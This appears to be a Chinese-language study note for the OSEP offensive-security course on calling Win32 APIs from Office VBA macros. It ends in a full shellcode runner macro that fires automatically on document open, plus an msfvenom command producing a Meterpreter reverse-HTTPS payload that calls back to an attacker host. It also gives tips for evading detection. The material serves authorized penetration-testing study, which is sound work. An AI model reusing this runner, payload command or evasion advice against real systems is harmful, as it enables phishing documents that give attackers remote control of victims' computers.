---
title: OSEP-03-VBA调用Win32API
description: '03-Office宏攻击 | 02-VBA调用Win32API'
pubDate: 2026-01-30T00:00:11+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Phishing
---

# VBA 调用 Win32 API 完整指南

> 对应参考资料：`1：office钓鱼.html` 中的 `3.1 Microsoft Office Macros` 与 `3.2 Executing Shellcode in Word Memory`。  
> 学习定位：这是 Office 宏攻击从“能弹窗”走向“能调用系统能力”的关键桥梁。只在授权实验环境中学习和验证。

## 这篇解决什么问题

初学者学 Office 宏时，很容易卡在一个地方：VBA 语法能看懂，`MsgBox` 也能弹出来，但一到 `VirtualAlloc`、`RtlMoveMemory`、`CreateThread` 就像突然换了一门语言。

这篇文档把它拆成四层：

```text
Office 文档
  -> VBA 宏入口
  -> Declare 声明 Win32 API
  -> 调用 Windows 内存/线程函数
  -> 为后续 Shellcode Runner 做准备
```

你不需要一开始就背 API 原型。你要先理解：VBA 本身只是 Office 内置脚本，它能做的事有限；Win32 API 才是 Windows 给程序调用系统能力的接口。

---

## 一、先建立整体心智模型

### 1.1 VBA 能做什么，不能做什么

VBA 擅长这些事：

| 能力 | 例子 | 攻击链中的意义 |
|---|---|---|
| Office 自动化 | 读写 Word、Excel、Outlook 对象 | 让文档打开后自动执行逻辑 |
| 字符串处理 | 拼接命令、解码文本 | 组装下载命令或配置 |
| 文件操作 | 创建、写入、读取文件 | Dropper 阶段可能会用到 |
| 调用 COM 对象 | `WScript.Shell`、`MSXML2.XMLHTTP` | 执行命令、发起网络请求 |
| 调用外部 DLL | `Declare ... Lib ...` | 进入 Win32 API 世界 |

VBA 不擅长这些事：

| 限制 | 为什么麻烦 |
|---|---|
| 不能直接分配可执行内存 | Shellcode 需要放到可执行内存中 |
| 不能直接创建系统线程 | 机器码需要一个线程入口开始执行 |
| 不能直接操作指针 | Windows API 大量使用指针和句柄 |
| 不能自然处理 32/64 位差异 | Office 位数、Windows 位数、payload 位数必须匹配 |

所以，Win32 API 的作用就是给 VBA “接上” Windows 底层能力。

### 1.2 Win32 API 是什么

Win32 API 是 Windows 暴露给应用程序的一组函数。你可以把它理解为操作系统的“系统函数库”。

```text
VBA 宏
  调用 Declare 声明的函数
    -> kernel32.dll / user32.dll / advapi32.dll / ntdll.dll
      -> Windows 内核或子系统完成实际动作
```

常见 DLL：

| DLL | 主要能力 | 本章关注度 |
|---|---|---|
| `kernel32.dll` | 内存、线程、进程、文件基础能力 | 很高 |
| `user32.dll` | 窗口、消息框、键鼠、UI | 中 |
| `advapi32.dll` | 用户、令牌、注册表、服务、安全 API | 中 |
| `ntdll.dll` | 更底层的 Native API | 后续 AV/EDR 绕过会遇到 |
| `ws2_32.dll` | Socket 网络通信 | 后续网络与载荷会遇到 |

对于 Office 宏攻击，最核心的是 `kernel32.dll` 中的内存和线程 API。

---

## 二、Declare 语句从零理解

### 2.1 基本语法

VBA 通过 `Declare` 引入 DLL 函数：

```vba
Private Declare PtrSafe Function 函数名 Lib "DLL名" Alias "真实导出名" (参数列表) As 返回类型
```

拆开看：

| 部分 | 含义 | 初学者记忆法 |
|---|---|---|
| `Private` | 只在当前模块可见 | 先用 `Private`，减少全局污染 |
| `Declare` | 声明外部函数 | 告诉 VBA “这个函数在外部 DLL 里” |
| `PtrSafe` | Office VBA7 兼容指针声明 | 64 位 Office 需要它 |
| `Function` | 有返回值的函数 | API 通常有返回值 |
| `Lib "kernel32"` | 函数所在 DLL | 可以写 `kernel32` 或 `kernel32.dll` |
| `Alias` | DLL 里的真实函数名 | 用于 A/W 后缀或改名 |
| 参数列表 | 传入 API 的参数 | 最容易错 |
| `As 返回类型` | API 返回值类型 | 指针/句柄常用 `LongPtr` |

示例：调用 `GetUserNameA` 获取当前用户名。

```vba
Private Declare PtrSafe Function GetUserNameA Lib "advapi32.dll" ( _
    ByVal lpBuffer As String, _
    ByRef nSize As Long _
) As Long
```

### 2.2 为什么有 Alias

很多 Windows API 有两个版本：

| 后缀 | 含义 | 例子 |
|---|---|---|
| `A` | ANSI 字符串版本 | `GetUserNameA` |
| `W` | Wide/Unicode 字符串版本 | `GetUserNameW` |

VBA 里可以这样写：

```vba
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" ( _
    ByVal lpBuffer As String, _
    ByRef nSize As Long _
) As Long
```

这表示：你在 VBA 中叫它 `GetUserName`，但 DLL 中实际查找 `GetUserNameA`。

### 2.3 ByVal 和 ByRef

这是初学者最容易混淆的点。

| 传参方式 | 含义 | 类比 |
|---|---|---|
| `ByVal` | 把值本身传进去 | 把数字写在纸上交给别人 |
| `ByRef` | 把变量地址传进去，让 API 可以改它 | 把笔记本交给别人，让他直接在里面改 |

Windows API 中很多参数本质是指针：

```c
BOOL GetUserNameA(
  LPSTR lpBuffer,
  LPDWORD pcbBuffer
);
```

这里：

| C 类型 | 真实含义 | VBA 写法 |
|---|---|---|
| `LPSTR` | 指向字符串缓冲区的指针 | `ByVal lpBuffer As String` |
| `LPDWORD` | 指向 DWORD 的指针 | `ByRef nSize As Long` |

如果 `ByVal` / `ByRef` 写错，常见结果是：

| 现象 | 可能原因 |
|---|---|
| 类型不匹配 | VBA 类型与 API 原型不一致 |
| Office 崩溃 | API 把一个普通数值当指针写入 |
| 返回 0 | 参数无效，API 调用失败 |
| 没有任何输出 | 缓冲区或长度传递方式不对 |

---

## 三、32 位与 64 位：先看 Office，不只看 Windows

### 3.1 关键原则

做 Office 宏实验时，位数判断顺序是：

```text
1. Office 是 32 位还是 64 位
2. VBA 进程是 32 位还是 64 位
3. PowerShell 子进程是 32 位还是 64 位
4. Shellcode 是 x86 还是 x64
5. 监听器 payload 类型是否一致
```

最容易踩坑的是：Windows 是 64 位，但 Office 可能是 32 位。

```text
64 位 Windows
  -> 32 位 Office
    -> 32 位 VBA 进程
      -> 只能稳定执行 x86 shellcode
```

### 3.2 `PtrSafe`、`LongPtr`、`LongLong`

| 类型/关键字 | 用途 | 什么时候用 |
|---|---|---|
| `PtrSafe` | 声明此 API 可在 VBA7 环境使用 | Office 2010+ 常见 |
| `LongPtr` | 指针大小自动适配 32/64 位 | 地址、句柄、指针 |
| `LongLong` | 固定 64 位整数 | 真正需要 64 位整数时 |
| `Long` | 32 位整数 | DWORD、标志位、普通整数 |

一句话记忆：

```text
地址和句柄用 LongPtr，普通常量和 DWORD 多数用 Long。
```

### 3.3 条件编译模板

为了兼容不同 Office 位数，可以使用条件编译：

```vba
#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As LongPtr, _
        ByVal dwSize As Long, _
        ByVal flAllocationType As Long, _
        ByVal flProtect As Long _
    ) As LongPtr
#Else
    Private Declare Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As Long, _
        ByVal dwSize As Long, _
        ByVal flAllocationType As Long, _
        ByVal flProtect As Long _
    ) As Long
#End If
```

学习阶段建议先固定一种环境，例如：

```text
Windows 10 x64 + Office x64 + x64 payload
```

等你理解流程后，再补 x86/x64 兼容写法。

### 3.4 在 VBA 里检查 Office 位数

```vba
Sub CheckOfficeBitness()
    #If Win64 Then
        MsgBox "当前 Office VBA 进程是 64 位"
    #Else
        MsgBox "当前 Office VBA 进程是 32 位"
    #End If
End Sub
```

不要只看系统属性。宏代码运行在哪个进程里，payload 就要和哪个进程匹配。

---

## 四、先用安全 API 练手

不要一开始就写 shellcode runner。先用无害 API 练习声明、参数和返回值。

### 4.1 MessageBoxA：确认 API 调用链可用

```vba
Private Declare PtrSafe Function MessageBoxA Lib "user32.dll" ( _
    ByVal hWnd As LongPtr, _
    ByVal lpText As String, _
    ByVal lpCaption As String, _
    ByVal uType As Long _
) As Long

Sub TestMessageBox()
    MessageBoxA 0, "Win32 API 调用成功", "VBA API Test", 0
End Sub
```

如果这个都不能运行，优先排查：

| 检查项 | 说明 |
|---|---|
| 宏是否启用 | Office 信任中心、受保护视图、Mark-of-the-Web |
| 代码是否在标准模块中 | 有些入口函数位置不对不会触发 |
| 声明是否放在模块顶部 | `Declare` 通常放在过程外 |
| Office 是否为 64 位 | 64 位需要 `PtrSafe` |

### 4.2 GetUserNameA：理解输出缓冲区

```vba
Private Declare PtrSafe Function GetUserNameA Lib "advapi32.dll" ( _
    ByVal lpBuffer As String, _
    ByRef nSize As Long _
) As Long

Sub TestGetUserName()
    Dim buffer As String
    Dim size As Long
    Dim ok As Long

    buffer = String(256, vbNullChar)
    size = 256

    ok = GetUserNameA(buffer, size)

    If ok <> 0 Then
        buffer = Left(buffer, InStr(buffer, vbNullChar) - 1)
        MsgBox "当前用户: " & buffer
    Else
        MsgBox "GetUserNameA 调用失败"
    End If
End Sub
```

这个例子最重要的不是用户名，而是理解：

```text
VBA 先准备一块字符串缓冲区
  -> 把缓冲区地址交给 API
  -> API 把结果写进缓冲区
  -> VBA 再从缓冲区中取出有效字符串
```

这和后面把 shellcode 写入内存是同一类思路。

---

## 五、Shellcode Runner 所需的三个核心 API

执行 shellcode 的基础流程是：

```text
1. VirtualAlloc 分配一段内存
2. RtlMoveMemory 把 shellcode 字节复制进去
3. CreateThread 从这段内存地址开始执行
```

### 5.1 VirtualAlloc：申请内存

C 原型：

```c
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

VBA 声明：

```vba
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long _
) As LongPtr
```

常用参数：

| 参数 | 学习阶段常用值 | 含义 |
|---|---|---|
| `lpAddress` | `0` | 让系统决定分配地址 |
| `dwSize` | shellcode 长度 | 要申请多少字节 |
| `flAllocationType` | `&H3000` | `MEM_COMMIT | MEM_RESERVE` |
| `flProtect` | `&H40` | `PAGE_EXECUTE_READWRITE` |

常量含义：

| 常量 | 值 | 含义 |
|---|---|---|
| `MEM_COMMIT` | `&H1000` | 提交内存 |
| `MEM_RESERVE` | `&H2000` | 保留地址空间 |
| `MEM_COMMIT Or MEM_RESERVE` | `&H3000` | 保留并提交 |
| `PAGE_READWRITE` | `&H04` | 可读可写，不可执行 |
| `PAGE_EXECUTE_READ` | `&H20` | 可读可执行 |
| `PAGE_EXECUTE_READWRITE` | `&H40` | 可读可写可执行 |

初学阶段常用 `&H40` 是为了减少变量；进阶阶段会学习先 `READWRITE` 写入，再用 `VirtualProtect` 改为 `EXECUTE_READ`，降低 RWX 内存特征。

### 5.2 RtlMoveMemory：复制字节

C 原型：

```c
VOID RtlMoveMemory(
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T Length
);
```

VBA 声明：

```vba
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
    ByVal Destination As LongPtr, _
    ByRef Source As Any, _
    ByVal Length As Long _
) As LongPtr
```

在 VBA 中常见写法是逐字节复制：

```vba
Dim i As Long
Dim b As Byte

For i = LBound(buf) To UBound(buf)
    b = buf(i)
    RtlMoveMemory addr + i, b, 1
Next i
```

为什么要逐字节？

| 原因 | 说明 |
|---|---|
| `buf` 常是 Variant 数组 | `msfvenom -f vbapplication` 输出通常是数字数组 |
| 每个元素代表一个字节 | 需要按顺序写入内存 |
| 易于调试 | 出错时能定位复制循环 |

注意：`UBound(buf)` 是最后一个索引，不一定等于长度。长度应写成：

```vba
bufSize = UBound(buf) - LBound(buf) + 1
```

如果直接把 `UBound(buf)` 当长度，数组从 0 开始时通常只少 1 个字节；某些情况下会导致 shellcode 不完整。

### 5.3 CreateThread：从内存地址开始执行

C 原型：

```c
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  SIZE_T                  dwStackSize,
  LPTHREAD_START_ROUTINE  lpStartAddress,
  LPVOID                  lpParameter,
  DWORD                   dwCreationFlags,
  LPDWORD                 lpThreadId
);
```

VBA 声明：

```vba
Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal dwStackSize As Long, _
    ByVal lpStartAddress As LongPtr, _
    ByVal lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, _
    ByRef lpThreadId As Long _
) As LongPtr
```

调用示例：

```vba
Dim hThread As LongPtr
Dim threadId As Long

hThread = CreateThread(0, 0, addr, 0, 0, threadId)
```

参数理解：

| 参数 | 常用值 | 含义 |
|---|---|---|
| `lpThreadAttributes` | `0` | 默认安全属性 |
| `dwStackSize` | `0` | 默认栈大小 |
| `lpStartAddress` | `addr` | 线程从 shellcode 地址开始执行 |
| `lpParameter` | `0` | 不传参数 |
| `dwCreationFlags` | `0` | 立即运行 |
| `lpThreadId` | `threadId` | 接收线程 ID |

### 5.4 WaitForSingleObject：让线程保持

VBA 声明：

```vba
Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
    ByVal hHandle As LongPtr, _
    ByVal dwMilliseconds As Long _
) As Long
```

调用：

```vba
WaitForSingleObject hThread, &HFFFFFFFF
```

`&HFFFFFFFF` 表示 `INFINITE`，永久等待。

为什么要等？

```text
不等待：
  宏创建线程
  -> 宏过程结束
  -> Office 状态可能变化
  -> 载荷线程可能不稳定

等待：
  宏创建线程
  -> 等待线程运行
  -> 连接更稳定，但 Word 进程可能保持占用
```

考试和实验中要结合场景取舍：直接在 Word 进程中等待，稳定但显眼；用 PowerShell 子进程执行，Word 关闭后连接更容易保持。

---

## 六、完整 VBA Shellcode Runner 学习模板

这个模板用于理解链路。请只在授权实验环境中使用，并把 IP、payload 和监听器保持一致。

```vba
Option Explicit

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long _
) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
    ByVal Destination As LongPtr, _
    ByRef Source As Any, _
    ByVal Length As Long _
) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal dwStackSize As Long, _
    ByVal lpStartAddress As LongPtr, _
    ByVal lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, _
    ByRef lpThreadId As Long _
) As LongPtr

Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
    ByVal hHandle As LongPtr, _
    ByVal dwMilliseconds As Long _
) As Long

Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE As Long = &H40
Private Const INFINITE As Long = &HFFFFFFFF

Sub AutoOpen()
    Main
End Sub

Sub Document_Open()
    Main
End Sub

Sub Main()
    Dim buf As Variant
    Dim bufSize As Long
    Dim addr As LongPtr
    Dim hThread As LongPtr
    Dim threadId As Long
    Dim i As Long
    Dim b As Byte

    ' 使用你自己的授权实验 payload 替换这里。
    ' 生成时要确认 payload 架构与 Office 位数一致。
    ' 注意：不要在 Array 的续行链中插入注释，VBA 会报语法错误。
    buf = Array( _
        252, 72, 131, 228, 240 _
    )

    bufSize = UBound(buf) - LBound(buf) + 1

    addr = VirtualAlloc(0, bufSize, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If addr = 0 Then
        MsgBox "VirtualAlloc failed"
        Exit Sub
    End If

    For i = LBound(buf) To UBound(buf)
        b = CByte(buf(i))
        RtlMoveMemory addr + (i - LBound(buf)), b, 1
    Next i

    hThread = CreateThread(0, 0, addr, 0, 0, threadId)
    If hThread = 0 Then
        MsgBox "CreateThread failed"
        Exit Sub
    End If

    WaitForSingleObject hThread, INFINITE
End Sub
```

关键检查点：

| 检查点 | 为什么重要 |
|---|---|
| `Option Explicit` | 防止变量拼写错误 |
| `bufSize` 用 `+ 1` | 避免少复制最后一个字节 |
| `CByte(buf(i))` | 确保每个元素是字节 |
| `i - LBound(buf)` | 兼容数组不是从 0 开始的情况 |
| 检查 `addr = 0` | 内存分配失败时不要继续执行 |
| 检查 `hThread = 0` | 线程创建失败时不要误判为网络问题 |

---

## 七、生成 shellcode 时的学习要点

常见实验命令：

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=<KALI_IP> \
  LPORT=443 \
  EXITFUNC=thread \
  -f vbapplication
```

注意点：

| 参数 | 说明 |
|---|---|
| `windows/x64/...` | 对应 64 位 Office 进程 |
| `windows/...` | 通常对应 32 位 payload |
| `reverse_https` | 目标主动连回监听器 |
| `LHOST` | 攻击机可被目标访问的 IP |
| `LPORT` | 监听端口，需与 handler 一致 |
| `EXITFUNC=thread` | 只退出当前线程，减少 Word 崩溃概率 |
| `-f vbapplication` | 输出 VBA 数组格式 |

监听器 payload 必须一致：

```text
生成 payload: windows/x64/meterpreter/reverse_https
监听 payload: windows/x64/meterpreter/reverse_https
Office 位数: 64 位
```

三者不一致时，最常见现象是：

| 现象 | 可能原因 |
|---|---|
| Word 崩溃 | shellcode 架构错误、API 声明错误 |
| 没有回连 | LHOST/LPORT 错误、网络不通、监听器 payload 不一致 |
| 只闪一下 | 线程退出、payload 被拦、没有等待 |
| 本地可用目标不可用 | 目标 Office 位数不同、AV/EDR、代理或出网限制 |

---

## 八、从“能运行”到“能排错”的实验顺序

不要一上来就跑完整 payload。建议按下面顺序：

### 8.1 阶段 1：宏入口确认

```vba
Sub AutoOpen()
    MsgBox "AutoOpen triggered"
End Sub

Sub Document_Open()
    MsgBox "Document_Open triggered"
End Sub
```

确认点：

| 问题 | 检查 |
|---|---|
| 没弹窗 | 宏未启用、文件格式不对、入口函数位置不对 |
| 只手动运行有效 | 自动入口没有放到正确模块或事件位置 |
| 目标机不触发 | Protected View、Mark-of-the-Web、组策略 |

### 8.2 阶段 2：Win32 API 调用确认

先运行 `MessageBoxA` 或 `GetUserNameA`。

如果 API 调不通，先不要碰 shellcode。API 声明层有问题时，payload 怎么换都没用。

### 8.3 阶段 3：内存分配确认

```vba
Sub TestVirtualAlloc()
    Dim addr As LongPtr
    addr = VirtualAlloc(0, 1024, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If addr = 0 Then
        MsgBox "VirtualAlloc failed"
    Else
        MsgBox "VirtualAlloc ok: 0x" & Hex(addr)
    End If
End Sub
```

### 8.4 阶段 4：payload 架构确认

在 Windows 侧确认：

```powershell
[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
$env:PROCESSOR_ARCHITECTURE
```

在 VBA 侧确认：

```vba
#If Win64 Then
    MsgBox "Office x64"
#Else
    MsgBox "Office x86"
#End If
```

### 8.5 阶段 5：网络确认

在上完整 payload 前先确认目标能访问攻击机：

```powershell
Test-NetConnection <KALI_IP> -Port 443
```

或者用一个简单 Web 服务下载文本：

```powershell
Invoke-WebRequest http://<KALI_IP>/test.txt -UseBasicParsing
```

---

## 九、常见错误排查表

| 现象 | 优先怀疑 | 怎么验证 | 处理思路 |
|---|---|---|---|
| 宏不执行 | 宏安全设置 | `MsgBox` 最小宏 | 检查信任中心、受保护视图、文件格式 |
| 编译报 `PtrSafe` | Office/VBA 版本差异 | 查看 Office 位数 | 使用 `PtrSafe` 和 `LongPtr` |
| 类型不匹配 | API 参数声明错 | 对照 MSDN 原型 | 指针用 `LongPtr`，DWORD 多用 `Long` |
| `VirtualAlloc` 返回 0 | 参数或权限问题 | 弹出返回值 | 检查 `dwSize`、内存保护常量 |
| Word 直接崩溃 | 架构不匹配 | Office 位数 vs payload | x86/x64 重新生成 |
| handler 无会话 | 网络或监听不一致 | `Test-NetConnection` | 对齐 LHOST/LPORT/payload |
| 会话一连就断 | `EXITFUNC` 或进程退出 | handler 输出 | 用 `EXITFUNC=thread`，考虑 PowerShell 子进程 |
| 本机能跑，靶机失败 | 安全机制 | Defender/AMSI/EDR 日志 | 切到 AV/AMSI/反射章节排查 |

---

## 十、和后续章节的关系

学完本篇后，你应该能解释：

```text
为什么 VBA 可以调用 kernel32.dll
为什么 shellcode 需要可执行内存
为什么 Office 位数决定 payload 位数
为什么 VirtualAlloc + RtlMoveMemory + CreateThread 是典型模式
为什么后续会引入 PowerShell 和反射技术
```

后续章节衔接：

| 后续文件 | 你会带着什么问题去学 |
|---|---|
| `03-VBA-Shellcode执行器.md` | 如何把本篇 API 组合成完整 runner |
| `06-PowerShell-Shellcode.md` | 为什么把执行链挪到 PowerShell 子进程 |
| `07-反射技术.md` | 为什么 `Add-Type` 文件落地会成为检测点 |
| `11-Office安全机制.md` | 为什么文档打开后宏可能不触发 |
| `15-客户端初始访问考试速查.md` | 考试里如何快速定位失败层级 |

---

## 十一、复习清单

完成本篇后，用下面问题自测：

```text
□ 能解释 Win32 API 和 VBA 的关系
□ 能写出 Declare 的基本结构
□ 能说明 PtrSafe、LongPtr、Long 的区别
□ 能解释 ByVal 和 ByRef 的区别
□ 能用 MessageBoxA 验证 API 调用
□ 能解释 VirtualAlloc 四个参数的含义
□ 能解释 RtlMoveMemory 为什么逐字节复制
□ 能解释 CreateThread 的 StartAddress 为什么是 shellcode 地址
□ 能判断 Office 位数、payload 位数和 handler payload 是否一致
□ 遇到 Word 崩溃时，能优先排查架构/API/内存保护
```

---

## 十二、练习任务

### 练习 1：API 调用入门

1. 写一个 `MessageBoxA` 调用。
2. 写一个 `GetUserNameA` 调用。
3. 记录每个参数为什么用 `ByVal` 或 `ByRef`。

### 练习 2：位数判断

1. 在 VBA 中判断 Office 位数。
2. 在 PowerShell 中判断当前进程位数。
3. 写下“Windows 位数”和“Office 位数”不一致时会发生什么。

### 练习 3：内存分配

1. 调用 `VirtualAlloc` 分配 1024 字节。
2. 弹出返回地址。
3. 改错一个参数，观察返回值或异常。

### 练习 4：完整链路复述

不用看文档，手写下面四步：

```text
1. 宏如何自动触发
2. VBA 如何声明 Win32 API
3. shellcode 如何进入内存
4. CPU 如何开始执行这段内存
```

能复述清楚，才算真的掌握本章。

---

**下一节**：[03-VBA-Shellcode执行器.md](/blog/osep/03-office宏攻击/03-vba-shellcode执行器/)
